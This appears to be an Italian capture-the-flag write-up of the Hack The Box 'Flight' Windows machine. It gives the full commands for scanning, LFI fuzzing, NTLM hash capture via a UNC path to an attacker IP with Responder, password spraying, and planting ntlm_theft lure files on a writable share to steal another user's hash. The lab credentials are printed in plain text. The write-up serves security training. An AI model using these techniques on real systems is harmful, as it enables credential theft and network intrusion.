# Flight

## Reconnaissance

Per prima cosa eseguo una scansione completa con _nmapAutomator_.

```text
sudo nmapAutomator.sh --host 10.10.11.187 --type All
```

Il risultato della scansione è il seguente:

```text
Host is likely running Windows


---------------------Starting Port Scan-----------------------

PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl


---------------------Starting Script Scan-----------------------

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: g0 Aviation
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-12 21:42:43Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-01-12T21:42:47
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: 7h00m00s


---------------------Starting Full Scan------------------------

PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49675/tcp open  unknown
49676/tcp open  unknown
49729/tcp open  unknown
49772/tcp open  unknown


Making a script scan on extra ports: 5985, 9389, 49667, 49675, 49676, 49729, 49772

PORT      STATE SERVICE    VERSION
5985/tcp  open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf     .NET Message Framing
49667/tcp open  msrpc      Microsoft Windows RPC
49675/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc      Microsoft Windows RPC
49729/tcp open  msrpc      Microsoft Windows RPC
49772/tcp open  msrpc      Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

----------------------Starting UDP Scan------------------------

PORT    STATE SERVICE      VERSION
53/udp  open  domain       (generic dns response: SERVFAIL)
| fingerprint-strings:
|   NBTStat:
|_    CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
88/udp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-01-12 21:49:14Z)
123/udp open  ntp          NTP v3
389/udp open  ldap         Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

--------------------Starting Vulns Scan-----------------------

Running CVE scan on all ports

PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
| vulners:
|   cpe:/a:apache:http_server:2.4.52:
|     	CVE-2022-31813	7.5	https://vulners.com/cve/CVE-2022-31813
|     	CVE-2022-23943	7.5	https://vulners.com/cve/CVE-2022-23943
|     	CVE-2022-22720	7.5	https://vulners.com/cve/CVE-2022-22720
|_    	CNVD-2022-73123	7.5	https://vulners.com/cnvd/CNVD-2022-73123
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-12 21:49:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49729/tcp open  msrpc         Microsoft Windows RPC
49772/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows


Running Vuln scan on all ports
This may take a while, depending on the number of detected services..


PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-trace: TRACE is enabled
| http-csrf:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=flight.htb
|   Found the following possible CSRF vulnerabilities:
|     
|     Path: http://flight.htb:80/
|     Form id: form_1
|     Form action: #
|     
|     Path: http://flight.htb:80/index.html
|     Form id: form_1
|_    Form action: #
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners:
|   cpe:/a:apache:http_server:2.4.52:
|     	CVE-2022-31813	7.5	https://vulners.com/cve/CVE-2022-31813
|     	CVE-2022-23943	7.5	https://vulners.com/cve/CVE-2022-23943
|     	CVE-2022-22720	7.5	https://vulners.com/cve/CVE-2022-22720
|     	CNVD-2022-73123	7.5	https://vulners.com/cnvd/CNVD-2022-73123
|     	OSV:BIT-2023-31122	6.4	https://vulners.com/osv/OSV:BIT-2023-31122
|     	CVE-2022-28615	6.4	https://vulners.com/cve/CVE-2022-28615
|     	CVE-2021-44224	6.4	https://vulners.com/cve/CVE-2021-44224
|     	CVE-2022-22721	5.8	https://vulners.com/cve/CVE-2022-22721
|     	CVE-2022-36760	5.1	https://vulners.com/cve/CVE-2022-36760
|     	OSV:BIT-2023-45802	5.0	https://vulners.com/osv/OSV:BIT-2023-45802
|     	OSV:BIT-2023-43622	5.0	https://vulners.com/osv/OSV:BIT-2023-43622
|     	F7F6E599-CEF4-5E03-8E10-FE18C4101E38	5.0	https://vulners.com/githubexploit/F7F6E599-CEF4-5E03-8E10-FE18C4101E38	*EXPLOIT*
|     	E5C174E5-D6E8-56E0-8403-D287DE52EB3F	5.0	https://vulners.com/githubexploit/E5C174E5-D6E8-56E0-8403-D287DE52EB3F	*EXPLOIT*
|     	DB6E1BBD-08B1-574D-A351-7D6BB9898A4A	5.0	https://vulners.com/githubexploit/DB6E1BBD-08B1-574D-A351-7D6BB9898A4A	*EXPLOIT*
|     	CVE-2023-31122	5.0	https://vulners.com/cve/CVE-2023-31122
|     	CVE-2023-27522	5.0	https://vulners.com/cve/CVE-2023-27522
|     	CVE-2022-37436	5.0	https://vulners.com/cve/CVE-2022-37436
|     	CVE-2022-30556	5.0	https://vulners.com/cve/CVE-2022-30556
|     	CVE-2022-29404	5.0	https://vulners.com/cve/CVE-2022-29404
|     	CVE-2022-28614	5.0	https://vulners.com/cve/CVE-2022-28614
|     	CVE-2022-26377	5.0	https://vulners.com/cve/CVE-2022-26377
|     	CVE-2022-22719	5.0	https://vulners.com/cve/CVE-2022-22719
|     	CVE-2006-20001	5.0	https://vulners.com/cve/CVE-2006-20001
|     	CNVD-2023-93320	5.0	https://vulners.com/cnvd/CNVD-2023-93320
|     	CNVD-2023-80558	5.0	https://vulners.com/cnvd/CNVD-2023-80558
|     	CNVD-2022-73122	5.0	https://vulners.com/cnvd/CNVD-2022-73122
|     	CNVD-2022-53584	5.0	https://vulners.com/cnvd/CNVD-2022-53584
|     	CNVD-2022-53582	5.0	https://vulners.com/cnvd/CNVD-2022-53582
|     	C9A1C0C1-B6E3-5955-A4F1-DEA0E505B14B	5.0	https://vulners.com/githubexploit/C9A1C0C1-B6E3-5955-A4F1-DEA0E505B14B	*EXPLOIT*
|     	BD3652A9-D066-57BA-9943-4E34970463B9	5.0	https://vulners.com/githubexploit/BD3652A9-D066-57BA-9943-4E34970463B9	*EXPLOIT*
|     	B0208442-6E17-5772-B12D-B5BE30FA5540	5.0	https://vulners.com/githubexploit/B0208442-6E17-5772-B12D-B5BE30FA5540	*EXPLOIT*
|     	A820A056-9F91-5059-B0BC-8D92C7A31A52	5.0	https://vulners.com/githubexploit/A820A056-9F91-5059-B0BC-8D92C7A31A52	*EXPLOIT*
|     	9814661A-35A4-5DB7-BB25-A1040F365C81	5.0	https://vulners.com/githubexploit/9814661A-35A4-5DB7-BB25-A1040F365C81	*EXPLOIT*
|     	5A864BCC-B490-5532-83AB-2E4109BB3C31	5.0	https://vulners.com/githubexploit/5A864BCC-B490-5532-83AB-2E4109BB3C31	*EXPLOIT*
|     	17C6AD2A-8469-56C8-BBBE-1764D0DF1680	5.0	https://vulners.com/githubexploit/17C6AD2A-8469-56C8-BBBE-1764D0DF1680	*EXPLOIT*
|_    	CVE-2023-45802	2.6	https://vulners.com/cve/CVE-2023-45802
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
| http-enum:
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.52 (win64) openssl/1.1.1m php/8.1.1'
|   /icons/: Potentially interesting folder w/ directory listing
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.52 (win64) openssl/1.1.1m php/8.1.1'
|_  /js/: Potentially interesting directory w/ listing on 'apache/2.4.52 (win64) openssl/1.1.1m php/8.1.1'
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-12 21:52:21Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
|_ssl-ccs-injection: No reply from server (TIMEOUT)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49729/tcp open  msrpc         Microsoft Windows RPC
49772/tcp open  msrpc         Microsoft Windows RPC

Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Dal grande numero di porte aperte sembrerebbe di trovarsi davanti a un Active Directory.

Aggiungo _flight.htb_ al file _/etc/hosts_ e passo alla fase successiva.

## Enumeration
Visito la pagina http://10.10.11.187/:

<p align="center">
  <img src="/Immagini/Windows-Box/Flight/flight-1.png"/>
</p>

Non trovo nulla di interessante ispezionando la pagina.

Provo ad utilizzare il comando _dirsearch_:

```bash
dirsearch -u http://10.10.11.187/
```

Ottengo il seguente risultato:

```text
[09:50:53] 200 -    2KB - /cgi-bin/printenv.pl
[09:51:04] 200 -    5KB - /images/
[09:51:06] 200 -    3KB - /js/
```

Visito le pagine trovate:
  - http://10.10.11.187/cgi-bin/printenv.pl:

<p align="center">
  <img src="/Immagini/Windows-Box/Flight/flight-2.png"/>
</p>

  - http://10.10.11.187/images:

<p align="center">
  <img src="/Immagini/Windows-Box/Flight/flight-3.png"/>
</p>

  - http://10.10.11.187/js:

<p align="center">
  <img src="/Immagini/Windows-Box/Flight/flight-4.png"/>
</p>

Ma non trovo nulla di interessante.

Provo ad utilizzare il comando _ffuf_ alla ricerca di qualche sottodominio:

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.flight.htb/
```

L'unico risultato ottenuto è la pagina http://school.flight.htb/. Aggiorno il file _/etc/hosts_ e visito la pagina:

<p align="center">
  <img src="/Immagini/Windows-Box/Flight/flight-5.png"/>
</p>

Questa volta le varie pagine presenti sono ispezionabili e utilizzano il parametro "?view=" su "index.php" per caricare la pagina corretta.

Per questo motivo provo a verificare la presenza della vulnerabilità LFI (Local File Inclusion) attraverso l'utilizzo di _ffuf_:

```bash
ffuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt -u http://school.flight.htb/index.php?view=FUZZ
```

Ottengo il seguente risultato:

<p align="center">
  <img src="/Immagini/Windows-Box/Flight/flight-6.png"/>
</p>

Risulta quindi essere vulnerabile.

Successivamente, provo a verificare la possibilità di utilizzare i path UNC (Universal naming convention) per accedere alle risorse in rete.

Utilizzo _responder_ per intercettare la richiesta di autenticazione:

```bash
sudo responder -I tun0 -v
```

E visito il seguente indirizzo:

```text
http://school.flight.htb/index.php?view=//10.10.14.8/prova
```

<p align="center">
  <img src="/Immagini/Windows-Box/Flight/flight-7.png"/>
</p>

**Funziona!**

Salvo l'hash nel file _hash..txt_ e uso _jhontheripper_ per ricavare la password:

<p align="center">
  <img src="/Immagini/Windows-Box/Flight/flight-8.png"/>
</p>

## Foothold
Utilizzo _smbmap_ per capire a quali share ha accesso l'utente _svc_apache_:

```bash
smbmap -H flight.htb -u 'svc_apache' -p 'S@Ss!K@*t13'
```

<p align="center">
  <img src="/Immagini/Windows-Box/Flight/flight-9.png"/>
</p>

Purtroppo questo utente ha accesso solo in lettura ad alcuni share.

Utilizzo il seguente comando per cercare qualcosa di utile all'interno degli share leggibili:

```bash
impacket-smbclient svc_apache:'S@Ss!K@*t13'@flight.htb
```

Ma, anche qui, non trovo nulla di interessante.

Quindi ricerco altri utenti all'interno del sistema:

```bash
impacket-lookupsid svc_apache:'S@Ss!K@*t13'@'flight.htb'
```

<p align="center">
  <img src="/Immagini/Windows-Box/Flight/flight-10.png"/>
</p>

Provo ad utilizzare la stessa password dell'utente _svc_apache_ su tutti gli utenti trovati attraverso l'utilizzo di _crackmapexec_. Prima di lanciare il comando creo un file _utenti.txt_ contenente la lista degli utenti:

```text
S.Moon
R.Cold
G.Lors
L.Kein
M.Gold
C.Bum
W.Walker
I.Francis
D.Truff
V.Stevens
O.Possum
```

Quindi eseguo il comando:

```bash
crackmapexec smb flight.htb -u ./utenti.txt -p 'S@Ss!K@*t13'
```

Così facendo scopro che l'utente _S.Moon_ utilizza la stessa password di _svc_apache_.

L'unica cosa che cambia rispetto all'utente _svc_apache_ è la possibilità di scrivere sulla cartella "Shared":

<p align="center">
  <img src="/Immagini/Windows-Box/Flight/flight-11.png"/>
</p>

## Lateral Movement
Per via del fatto che molti utenti potrebbero accedere alla cartella "Shared" devo trovare un modo per sfruttare questa possibilità.

In ambiente Windows, capita spesso che i file vengano eseguiti in maniera automatica quando inseriti all'interno di una cartella. Quindi cerco di sfruttare questa caratteristica per potermi mettere in contatto con la macchina vittima e ricavare l'hash di qualche utente.

Per fare questo utilizzo il tool [ntlm_theft](https://github.com/Greenwolf/ntlm_theft.git) che crea diversi file che potrebbero essere sfruttati per rubare l'hash di qualche utente che accede alla cartella.

Imposto _responder_ per intercettare eventuali richieste:

```bash
responder -I tun0 -v
```

```bash
python3 ntlm_theft.py --generate all --server 10.10.14.8 --filename htb
```

Successivamente, carico i file sulla cartella "Shared":

```bash
impacket-smbclient s.moon:'S@Ss!K@*t13'@flight.htb
use Shared
put "htb\FILE"
```

Dopo aver caricato alcuni il file _htb/desktop.ini_, ricevo la seguente richiesta dall'utente _c.bum_:

<p align="center">
  <img src="/Immagini/Windows-Box/Flight/flight-12.png"/>
</p>

Quindi copio l'hash all'interno del file _hash_cbum.txt_ e utilizzo _jhontheripper_:

<p align="center">
  <img src="/Immagini/Windows-Box/Flight/flight-13.png"/>
</p>

Utilizzo _smbmap_ per verificare i permessi dell'utente _c.bum_:

```bash
crackmapexec smb flight.htb -u c.bum -p 'Tikkycoll_431012284' --shares
```
<p align="center">
  <img src="/Immagini/Windows-Box/Flight/flight-14.png"/>
</p>

In questo caso, l'utente _c.bum_ ha permessi in scrittura anche per lo share Web.

Ma prima di ispezionare quello share, vado alla ricerca del primo flag in "Users":

```bash
impacket-smbclient c.bum:'Tikkycoll_431012284'@flight.htb
```

Nella directory "..\Users\C.Bum\Desktop\" trovo il primo flag:

<p align="center">
  <img src="/Immagini/Windows-Box/Flight/flight-15.png"/>
</p>

## Privilege Escalation

...
